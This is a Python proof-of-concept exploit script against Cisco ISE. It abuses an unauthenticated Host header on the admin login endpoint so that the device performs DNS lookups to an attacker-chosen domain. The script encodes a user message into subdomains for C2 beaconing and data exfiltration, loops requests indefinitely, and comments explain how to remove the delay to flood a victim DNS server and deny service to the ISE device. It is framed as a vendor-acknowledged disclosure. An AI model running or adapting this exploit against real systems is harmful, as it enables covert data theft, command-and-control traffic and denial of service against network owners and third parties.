# Cisco ISE (All Current) - Host header Injection / CSRF / External DNS Interaction / Volumetric DDoS in Cisco ISE - (v.3.1.0.518 patch 3 shown, OTHERS)
# Acknowledged as CISCO "bug": 
# https://bst.cisco.com/bugsearch/bug/CSCwd41436

# The Cisco ISE Cisco ISE web application accepts unauthenticated input via  HOST HEADER without CSRF protection.
# This allows for multiple exploitable conditions. In this PoC code, a C2 beacon / simply encrpyted payload is accepted via argument and tunneled to an attacker controlled or floods a targeted DNS Server.
# Allows Denial of Service, Beaconing, Traffic Tunneling through insecure parameters.
# Discovered by Ken 's1ngular1ty' Pyle

import requests
import string
import random
import time


# ROT13 encoding and stripping of non-alphanumeric characters for simple DNS transport. PoC for exfiltration via HTTP Triggered DNS Requests.

def encode_rot13(plain):
    alphabet = string.ascii_lowercase
    cipher = ''
    for char in plain:
        if char.lower() in alphabet:
            cipher += chr((ord(char.lower()) - 97 + 13) % 26 + 97)
        else:
            cipher += char
    return cipher

# Exploit - CSRF / SSRF / DNS Interaction. The Cisco ISE web application accepts unauthenticated input via  HOST HEADER without CSRF protection. 
# Uses FQDNS & IPs, performs a DNS lookup against the target. Accepts arbitrary input.
# No CVE for this, disclosed to vendor.
# Replace CORP.XYZ with a BURP Collaborator beacon or FQDN to collect.

def send_post_request(c2signal, host, user_agent):
    url = "https://VULNERABLEAPPLICATION/admin/LoginAction.do"
    headers = {
        "HOST": host,
        "USERAGENT": user_agent
    }
    data = {
        "c2signal": c2signal
    }
    requests.post(url, headers=headers, data=data, verify=False)

def main():
    

# PoC - Type out a 64 character or less message or c2 beacon. This will repeat at random intervals and tunnel to a DNS c2 server
    plain = input("Enter plain text (64 characters max): ")
    plain = plain[:64]
    c2signal = encode_rot13(plain)
    c2signal = ''.join(char for char in c2signal if char.isalnum())
    host = c2signal + ".corp.xyz"
    user_agent = "CYBIRPOC"

# Repeat Beaconing Message request at random intervals

    while True:
        send_post_request(c2signal, host, user_agent)

#Uncomment these lines to unrestrict signaling / lookup / DoS & Flood victim with requests via Cisco ISE Device. Will also DoS the ISE device.
        #wait_time = random.uniform(30, 300)
        #time.sleep(wait_time)

if __name__ == '__main__':
    main()
